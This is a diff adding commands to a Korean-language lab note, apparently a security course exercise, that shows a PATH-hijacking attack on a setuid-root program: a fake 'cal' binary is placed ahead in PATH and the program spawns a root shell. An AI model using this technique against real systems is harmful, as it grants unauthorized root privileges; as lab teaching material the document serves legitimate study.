@@ -154,5 +154,22 @@ int main(){
 ```
 
 ```shell
+$ gcc -o vul vulnerable.c
+$ sudo chown root vul
+$ sudo chmod 4755 vul
+$ vul
+달력 출력
+
+$ gcc -o cal cal.c
+$ export PATH = .:$PATH
+$ vul
+#
+#
+쉘(/bin/dash) 실행 -> 공격 성공
+$ prid
+ruid = seed euid = root
+```
+	- /bin/dash에 의한 자동 권한 하향을 비활성화하기 위해 다음 작업 수행해야 함
+```shell
 
 ```
